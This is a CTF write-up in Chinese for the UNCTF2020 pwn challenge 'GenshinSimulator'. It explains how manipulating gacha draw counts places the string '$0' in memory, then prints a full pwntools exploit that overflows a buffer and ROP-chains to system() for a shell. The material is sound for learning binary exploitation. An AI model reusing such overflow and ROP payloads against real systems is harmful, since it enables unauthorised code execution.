
## GenshinSimulator
- 题目描述
- 题目附件：[GenshinSimulator](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/unctf2020/pwn/GenshinSimulator/GenshinSimulator)
- 考察点：ret2text
- 难度：一般

### 程序分析
这题挺好玩儿。抽卡模拟器

``` 
欢迎使用原神抽卡模拟器！祝你好运~
请选择：[1]单抽 [2]十连 [3]结束抽卡
2
抽卡结果如下：
★★★ 神射手之誓
★★★ 沐浴龙血的剑
★★★★ 砂糖
★★★ 以理服人
★★★★ 雷泽
★★★ 沐浴龙血的剑
★★★★ 行秋
★★★★ 北斗
★★★★ 西风秘典
★★★★ 北斗
请选择：[1]单抽 [2]十连 [3]结束抽卡
1
抽卡结果如下：
★★★★ 笛剑
请选择：[1]单抽 [2]十连 [3]结束抽卡
3
恭喜你，一共抽到了5个4星角色、0个5星角色、4个3星武器、2个4星武器、0个5星武器！
请选择：[1]向好友炫耀 [2]退出
xxxbof
```

### 解题思路
可以十连抽，也可以单抽，抽卡结果在bss段。

退出时有个缓冲区溢出，程序中有`system`函数，没开PIE，因此直接控制抽三星卡的数量为`0x3024`，构造`'$0'`，然后直接ret2text，执行system("$0")即可。

``` python
prdi = 0x0000000000400d13 # pop rdi ; ret

target = 0x3024 # $0

cnt = 0
while 1:
    if target-cnt>9:
        sla('[1]单抽 [2]十连 [3]结束抽卡\n','2')
    else:
        sla('[1]单抽 [2]十连 [3]结束抽卡\n','1')
    ru('抽卡结果如下：\n')
    data = ru('请选择')
    for i in data.split('\n'):
        if i[:10] == '\xe2\x98\x85\xe2\x98\x85\xe2\x98\x85 ':
            cnt += 1
    print target - cnt
    if target - cnt == 0:
        break
    if target - cnt < 0:
        print 'try again'
        exit()
print 'done'
print cnt

sla('[1]单抽 [2]十连 [3]结束抽卡\n','3')
sla('请选择：[1]向好友炫耀 [2]退出\n','1')
ru('请输入你的名字：\n')
context.log_level = 'debug'

offset = 56
payload = 'A'*offset
payload += p64(prdi+1)
payload += p64(prdi) + p64(0x602314)
payload += p64(elf.sym['system'])

sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/unctf2020/pwn/GenshinSimulator) 

